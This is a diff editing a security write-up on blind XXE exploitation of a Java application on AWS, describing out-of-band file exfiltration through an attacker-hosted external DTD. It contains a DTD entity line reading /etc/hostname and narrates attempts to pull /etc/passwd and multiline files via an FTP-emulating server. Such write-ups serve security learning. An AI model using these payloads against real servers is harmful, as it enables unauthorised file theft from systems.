@@ -105,7 +105,7 @@ At this point, the vulnerable server makes an outbound HTTP request to the attac
 
 #### 2nd. payload
 
-The <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
+The external DTD file <b>poc.dtd</b> file, hosted on the attacker's server, contains the actual exfiltration code:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
@@ -137,10 +137,12 @@ I always wanted to use that gif... thanks [André](https://x.com/0xacb/status/19
 And just like that I successfully exfiltrated an internal filesystem file from the AWS instance. 
 Great, let's try reading something more sensitive `/etc/passwd`:
 
-No luck... The call to my collaborator was empty. I tried with different files but still nothing was returned to my collaborator instance... OK, until this point I'd read a ton of writeups about XXE on Java applications and I knew I was facing the line termination (multiline files) restriction, so only single line files could be read out.
+No luck... 
 
-Time to pull out the FTP trick to exfil mutiline files (thanks to Novikov). I found a [script](https://github.com/lc/230-OOB/blob/master/230.py) created by [Corben Leo](https://x.com/hacker_) that emulates an FTP server for OOB attacks.
+The call to my collaborator was empty. I tried with different files but still nothing was returned to my collaborator instance. OK, until this point I'd read a ton of writeups about XXE on Java applications so I knew I was facing the line termination (multiline files) restriction, therefore only single line files could be read out.
 
-After having a lot of issues setting up the server on my VPS (skill issue), I finally was able to do it. Then, I repeated all the exploitation steps, which lead me to...  
+Time to pull out the FTP trick to exfil multiline files, thanks to [Novikov](https://web.archive.org/web/20141023173000/http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html). I found a [script](https://github.com/lc/230-OOB/blob/master/230.py) created by [Corben Leo](https://x.com/hacker_) that emulates an FTP server for OOB attacks.
+
+After having a some issues setting up the server on my VPS (skill issue), I finally was able to do it. Then, I repeated all the exploitation steps, which lead me to...  
 
 Nada land, again.
